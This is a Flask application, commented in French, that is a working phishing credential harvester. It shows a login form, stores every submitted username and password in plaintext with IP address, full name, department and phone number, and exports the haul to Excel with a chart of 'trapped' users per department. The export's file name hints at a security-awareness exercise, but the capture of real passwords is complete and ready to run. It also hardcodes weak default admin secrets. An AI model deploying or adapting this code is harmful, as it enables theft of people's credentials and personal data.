import os
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file
import openpyxl
from openpyxl.chart import BarChart, Reference

app = Flask(__name__)

# Clés de configuration
app.secret_key = os.environ.get('SECRET_KEY', 'admin_secret_key')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin_1234')

# Base de données temporaire en mémoire
logs_db = []

# ==========================================
# 1. ROUTES UTILISATEUR (PAGE D'ACCUEIL & SUITE)
# ==========================================

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password')
        
        # Enregistrement des identifiants interceptés
        entry = {
            'id': len(logs_db) + 1,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'username': username,
            'password': password,
            'ip': request.remote_addr,
            'fullname': '',
            'department': '',
            'phone': ''
        }
        logs_db.append(entry)
        session['user_id'] = entry['id']
        
        # Redirection vers le deuxième formulaire (profil)
        return redirect(url_for('profile'))
        
    # Affiche la page de connexion utilisateur
    return render_template('login.html')

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    user_id = session.get('user_id')
    if request.method == 'POST':
        fullname = request.form.get('fullname')
        department = request.form.get('department')
        phone = request.form.get('phone')
        
        # Mise à jour des données saisies
        if user_id:
            for log in logs_db:
                if log['id'] == user_id:
                    log['fullname'] = fullname
                    log['department'] = department
                    log['phone'] = phone
                    break
        return redirect(url_for('success'))
        
    return render_template('profile.html')

@app.route('/success')
def success():
    return render_template('success.html')


# ==========================================
# 2. ROUTES ADMINISTRATION (/admin)
# ==========================================

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['is_admin'] = True
            flash('Connexion réussie !', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Mot de passe incorrect.', 'error')
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('is_admin', None)
    flash('Vous avez été déconnecté.', 'info')
    return redirect(url_for('admin_login'))

@app.route('/admin')
def admin_dashboard():
    if not session.get('is_admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin.html', logs=logs_db)

@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('is_admin'):
        return redirect(url_for('admin_login'))
    logs_db.clear()
    flash('Toutes les données ont été effacées.', 'info')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/export-excel')
def export_excel():
    if not session.get('is_admin'):
        return redirect(url_for('admin_login'))

    wb = openpyxl.Workbook()
    
    # Feuille 1 : Identifiants
    ws_data = wb.active
    ws_data.title = "Identifiants"
    ws_data.append(["ID", "Date/Heure", "Nom d'utilisateur", "Mot de passe", "IP", "Nom complet", "Département", "Téléphone"])

    dept_counts = {}
    for log in logs_db:
        ws_data.append([
            log['id'], log['timestamp'], log['username'], log['password'],
            log['ip'], log['fullname'], log['department'], log['phone']
        ])
        dept = log['department'] or "Non renseigné"
        dept_counts[dept] = dept_counts.get(dept, 0) + 1

    # Feuille 2 : Statistiques avec graphique
    ws_stats = wb.create_sheet(title="Statistiques")
    ws_stats.append(["Département", "Nombre de piégés"])
    for dept, count in dept_counts.items():
        ws_stats.append([dept, count])

    if dept_counts:
        chart = BarChart()
        chart.type = "col"
        chart.style = 10
        chart.title = "Répartition des pièges par département"
        chart.y_axis.title = "Nombre"
        chart.x_axis.title = "Département"

        data = Reference(ws_stats, min_col=2, min_row=1, max_row=len(dept_counts) + 1)
        cats = Reference(ws_stats, min_col=1, min_row=2, max_row=len(dept_counts) + 1)
        chart.add_data(data, titles_from_data=True)
        chart.set_categories(cats)
        ws_stats.add_chart(chart, "D2")

    file_path = "rapport_sensibilisation.xlsx"
    wb.save(file_path)
    return send_file(file_path, as_attachment=True)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)